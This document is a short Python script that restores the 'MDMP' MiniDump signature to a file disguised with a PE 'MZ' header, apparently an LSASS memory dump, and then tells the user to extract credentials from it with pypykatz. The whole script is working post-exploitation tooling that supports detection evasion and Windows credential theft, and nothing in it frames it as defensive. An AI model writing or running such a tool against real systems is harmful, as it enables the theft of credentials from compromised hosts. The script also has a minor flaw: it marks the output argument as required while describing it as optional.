#!/usr/bin/env python3
import sys
import argparse
import os

def replace_file_signature(input_file, output_file=None):
    if not os.path.exists(input_file):
        print(f"Error: Input file '{input_file}' does not exist.")
        return False

    if output_file is None:
        output_file = input_file
        backup_file = input_file + ".backup"
        if os.path.exists(backup_file):
            print(f"Warning: Backup file '{backup_file}' already exists. Skipping backup.")
        else:
            try:
                import shutil
                shutil.copy2(input_file, backup_file)
                print(f"Created backup: {backup_file}")
            except Exception as e:
                print(f"Warning: Could not create backup: {e}")

    original_signature = b'\x4D\x5A\x90\x00'  # (PE Magic header)
    new_signature = b'\x4D\x44\x4D\x50'      # MDMP

    try:
        with open(input_file, 'rb') as f:
            data = bytearray(f.read())
        if len(data) < 4:
            print(f"Error: File is too small (only {len(data)} bytes).")
            return False

        if data[:4] != original_signature:
            print(f"Warning: Original signature not found. Current first 4 bytes: {data[:4].hex(' ')}")
            response = input("Do you want to replace anyway? (y/N): ").lower().strip()
            if response != 'y':
                print("Operation cancelled.")
                return False

        data[:4] = new_signature
        with open(output_file, 'wb') as f:
            f.write(data)

        print(f"Successfully restored MiniDump signature in '{output_file}'")
        # print(f"Old signature: {original_signature.hex(' ').upper()}")
        # print(f"New signature: {new_signature.hex(' ').upper()}")
        print(f"Now run [ pypykatz lsa minidump {output_file} ] to parse the minidump")
        return True

    except Exception as e:
        print(f"Error processing file: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Restore MiniDump Signature"
    )
    parser.add_argument(
        'input_file',
        help="Path to the input binary file"
    )
    parser.add_argument(
        'output_file',
        help="Output file path (default: overwrite input file with backup)"
    )
    args = parser.parse_args()
    success = replace_file_signature(args.input_file, args.output_file)
    return 0 if success else 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)
